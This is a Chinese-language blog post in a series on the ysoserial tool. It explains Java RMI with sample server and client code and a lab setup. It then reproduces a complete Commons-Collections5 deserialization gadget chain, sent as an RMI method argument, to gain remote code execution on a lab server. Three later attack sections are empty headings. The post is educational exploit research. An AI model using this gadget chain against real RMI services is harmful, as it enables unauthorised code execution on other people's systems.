---
title: Ysoserial工具解读（六）
date: 2019-11-19 14:45:24
tags: [Java, RCE,反序列化]
categories: 漏洞分析
---

## 基础知识

### RMI是什么

RMI（Remote Method Invocation，远程方法调用）类似于RPC（Remote Process Call，远程过程调用），常被用在分布式环境中（如阿里的Dubbo框架）。假设A主机需要处理大量的计算任务，而B主机这会儿没有任务，这时可以用RMI将一部分任务分给B来做，提高效率。

客户端（A主机）和服务端（B主机）之间的通信实际交给位于各自JVM的Stub（存根）和Skeleton（不知道怎么翻译，但官方说明jdk8以后不再依赖这个组件）执行，而在这期间，RMI registry注册表扮演着图书管理员的角色。具体的实现过程如下图：

1. 当Server有一个Service对象提供给外部调用时，它需要先向注册表登记
2. 当Client需要调用Service对象时，就要先去注册表查询可用的对象名称
3. 注册表会将该对象的存根Stub发送给Client
4. Client根据事先获知的接口调用需要的方法，参数实际上是交给了自己JVM中的Stub
5. Stub会将参数序列化后发送给Server上的JVM中的Skeleton
6. Skeleton将参数反序列化后呈递给Service对象
7. JVM结合方法声明和参数并将运算结果返回Skeleton
8. Skeleton再将运算结果发送给Client对象

![](Ysoserial工具解读（六）\rmi.JPG)

### 代码示例

要求：Server端和Client端之间共享一个接口。

```java
/**
**	通用接口：
**/
import java.rmi.Remote;
import java.rmi.RemoteException;

//远程接口
public interface ImInterface extends Remote {
    public String hello(String a) throws RemoteException;
}
```
可以用`javac`将编译成class文件发给对方，或者直接告诉其源码内容（类名称、方法名称必须相同）
```java
/**
**	Server端：Rmf_server.java
**/
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.Registry;
import java.rmi.registry.LocateRegistry;
import java.rmi.server.UnicastRemoteObject;

public class Rmf_server{

    public class RemoteHelloWorld extends UnicastRemoteObject implements ImInterface {
        private RemoteHelloWorld() throws RemoteException {
            super();
            System.out.println("you're in construction.");
        }

        public String hello(String a) throws RemoteException {
            System.out.println("call from");
            return "Hello world";
        }
    }

    //注册远程对象
    private void start() throws Exception {
        //远程对象实例
        RemoteHelloWorld h = new RemoteHelloWorld();
        //创建注册中心
        Registry registry = LocateRegistry.createRegistry(5599);
        //绑定对象实例到注册中心
        registry.bind("Hello", h);
    }

    public static void main(String[] args)throws Exception{
        new Rmf_server().start();
    }

}


/**
**	Client端：HappyEnding.java
**/
import java.lang.System;
import java.rmi.Naming;

public class HappyEnding{

    public static void main(String[] args) throws Exception {
        // list()方法用来查询目标主机上注册机中可用的对象名
        String[] names = Naming.list("rmi://10.10.10.136:5599/");
        for( String name : names){
            System.out.println(name);
        }
        // lookup()方法获取目标对象的Stub
        ImInterface ss = (ImInterface)Naming.lookup(names[0]);
        String result = ss.hello("ni hao!");
        System.out.println(result);

    }        

}
```

在启动server端后，用client端去连，可以看到调用成功返回的结果：

```powershell
F:\Studio>java HappyEnding
//10.10.10.136:5599/Hello
Hello world
```

### 环境搭建

为了模拟两机RMI通信，我在VMware上搭建了一个Linux系统（IP：10.10.10.136），宿主机为windows（IP：10.10.10.1）。因为该Linux系统中有VS code，我又装了个gradle来进行包管理。具体流程如下：

```bash
// linux安装gradle
sudo apt install gradle -y 

// vscode搜索Java Extension Package插件安装

// 新建项目文件夹后，用vsc打开，并在终端中输入：
gradle init --type java-application

// 修改build.gradle中的仓库地址，原地址jcenter()会指向google的服务器，国内无法连接
// 建议使用阿里云的仓库
/**
**	build.gradle
**/
repositories {
    // Use jcenter for resolving your dependencies.
    // You can declare any Maven/Ivy/file repository here.
    // jcenter()
    // mavenCentral()
    maven { url 'http://maven.aliyun.com/nexus/content/groups/public'}
    maven { url 'http://maven.aliyun.com/nexus/content/repositories/jcenter'}
}

// 跟gradle有关的命令：
// 编译：
gradle build --stacktrace
// 运行：
gradle run 
```

## 利用姿势

RMI在启动和通信过程中存在多个序列化与反序列化过程，例如：Client在调用远程方法时会将参数序列化，Server在处理请求时会将参数反序列化；Server在绑定对象到注册机时会先序列化，注册机在登记并生成Stub时会反序列化；Server将结果返回给Client时也会进行序列化，Client再读取结果时再做反序列化操作（待考证）。

因此，至少存在三种攻击方式。

### 攻击Server——方法1

先来模拟下攻击Server的过程，既然在RMI通信过程中，Server会将我们（Client）提供的参数反序列化，那我们将恶意类作为参数发给Server，如果Server的classpath存在该恶意类的调用链，就能够形成远程代码执行。根据这一思路，我写了以下代码：

```java
/**
**	Server端build.gradle
**/
dependencies {
	// 引入我们需要的有漏洞的jar包
    compile group: 'commons-collections', name: 'commons-collections', version: '3.1'
}
```

由于我在Linux服务器上装的jdk版本是1.8，所以直接将之前分析过的Commons-Collections5的payload源码拿过来用：

```java
/**
**	Client端
**/
import java.lang.System;
import java.rmi.Naming;
import java.util.HashMap;
import java.util.Map;
import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;


public class HappyEnding{

    public static void main(String[] args) throws Exception {
        String[] names = Naming.list("rmi://10.10.10.136:5599/");
        for( String name : names){
            System.out.println(name);
        }

        ImInterface ss = (ImInterface)Naming.lookup(names[0]);

        // generate the payload
         
        final String[] execArgs = new String[] { "vlc" };

        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };

        Transformer transformerChain = new ChainedTransformer(transformers);

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        // =========================== 我是分隔符 ==================================
		BadAttributeValueExpException val = new BadAttributeValueExpException(null);

        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, entry);
		// ========================================================================
        
        String result = ss.hello(val);

        System.out.println(result);
    }        
}
```

**小提示1：**为了方便，Client端我没有创建java项目，因此编译过程需要指定classpath才能完成编译。Windows中gradle默认的jar包下载目录在`C:\Users\xxxx\.gradle\caches\modules-2\files-2.1\`中，因此编译语句与执行语句如下：

```powershell
## 编译过程
javac -cp C:\Users\xxxx\.gradle\caches\modules-2\files-2.1\commons-collections\commons-collections\3.1\40fb048097caeacdb11dbb33b5755854d89efdeb\commons-collections-3.1.jar;. HappyEnding.java

## 运行过程
java -cp C:\Users\xxxx\.gradle\caches\modules-2\files-2.1\commons-collections\commons-collections\3.1\40fb048097caeacdb11dbb33b5755854d89efdeb\commons-collections-3.1.jar;. HappyEnding
```

**小提示2：**之前在分析恶意Payload时有一点不太明白，就是有些恶意类看似可以直接装入集合类，但ysoserial的作者们却都选择了“先用正常数据初始化集合类，再用反射机制将恶意类对象替换入集合类”的方法。最初我以为是为了应对命令行参数，这次复现过程中我发现，如果采用直接装入集合类的方式，在有些情况下还没等序列化完成payload就被触发了，导致整个生成过程中断，所以大家采用了后一种方法。可能读者会不知所云，这里举个例子：

```java
// 以上面的代码段为例，如果不用分隔符中的那段代码
// 而是按我想当然的写法来做：
BadAttributeValueExpException val = new BadAttributeValueExpException(entry);

// 看似一句话就能将恶意entry送入BadAttributeValueExpException对象完成初始化
// 但在实际运行过程中，程序在初始化val对象时会先初始化entry对象，从而使payload在本地先执行
// 这不光会打断生成逻辑，试想本地是win系统，而被攻击者是linux系统
// 你要执行的代码在win下无法识别，此时程序就会报运行时错误，程序也无法到达发送序列化参数那一步
// 所以先用正常数据完成对象初始化，最后用反射机制填入恶意类对象的办法很管用
```

运行效果如图：

![](Ysoserial工具解读（六）\exp1.jpg)

实际在Server端的调用栈如下图：

![](Ysoserial工具解读（六）\Server_rdobj.jpg)

因为RCE肯定会执行到`BadAttributeValueExpException`的`ReadObject()`方法，所以在这里打了断点守着。从图中可以看出大致的调用过程：线程池ThreadPool收到连接请求后，对传输数据TCPTransport解析识别，并对其中的数据进行反序列化`UnicastRef.unmashalValue()`，最后经过`java.io`的层层调用，到达了恶意类的`ReadObject()`方法，后面的调用过程这里不再赘述。

### 攻击Server——方法2



### 攻击Registry



### 攻击Client



## References

* https://xz.aliyun.com/t/6660 
* https://xz.aliyun.com/t/2649
* https://xz.aliyun.com/t/2651 
* https://xz.aliyun.com/t/2650 
* https://www.anquanke.com/post/id/194384 
* https://www.anquanke.com/post/id/190468

